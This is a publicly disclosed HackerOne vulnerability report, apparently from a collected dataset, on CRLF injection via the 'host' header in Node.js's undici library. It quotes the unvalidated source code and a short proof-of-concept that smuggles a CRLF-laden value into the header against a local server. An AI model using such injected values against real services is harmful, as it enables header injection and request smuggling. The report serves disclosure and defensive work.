---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1878489'
original_report_id: '1878489'
title: CRLF Injection in Nodejs ‘undici’ via host
weakness: CRLF Injection
team_handle: ibb
created_at: '2023-02-18T14:54:34.795Z'
disclosed_at: '2023-03-29T21:15:31.973Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 10
asset_identifier: https://github.com/nodejs/node
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- crlf-injection
---

# CRLF Injection in Nodejs ‘undici’ via host

## Metadata

- HackerOne Report ID: 1878489
- Weakness: CRLF Injection
- Program: ibb
- Disclosed At: 2023-03-29T21:15:31.973Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Summary: 
undici library should be protects HTTP headers from CRLF injection vulnerabilities. However, CRLF injection exists in the ‘host’ header of undici.request api.
Description:
like https://hackerone.com/reports/1664019
Source code:
lib/core/request.js:296

```javascript
function processHeader (request, key, val) {
  if (val && (typeof val === 'object' && !Array.isArray(val))) {
    throw new InvalidArgumentError(`invalid ${key} header`)
  } else if (val === undefined) {
    return
  }

  if (
    request.host === null &&
    key.length === 4 &&
    key.toLowerCase() === 'host'
  ) {
    // Consumed by Client
    request.host = val // without headerCharRegex.exec(val)
  } else if (
    request.contentLength === null &&
...
```
Example:
```javascript
import { request } from 'undici'

const unsanitizedContentTypeInput =  '12 \r\n\r\naaa:aaa'

const {
    statusCode,
    headers,
    trailers,
    body
} = await request('http://127.0.0.1:23333', {
    method: 'GET',
    headers: {
        'content-type': 'application/json',
        'host': unsanitizedContentTypeInput
    }
})

console.log('response received', statusCode)
console.log('headers', headers)

for await (const data of body) {
    console.log('data', data)
}

console.log('trailers', trailers)

```
{F2182450}
I have submitted the report： https://hackerone.com/reports/1820955
Security Releases: https://nodejs.org/en/blog/vulnerability/february-2023-security-releases/#fetch-api-in-node-js-did-not-protect-against-crlf-injection-in-host-headers-medium-cve-2023-23936
Security Advisory: https://github.com/nodejs/undici/security/advisories/GHSA-5r9g-qh6m-jxff

## Impact

All versions of the 19.x, 18.x and 16.x release lines.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
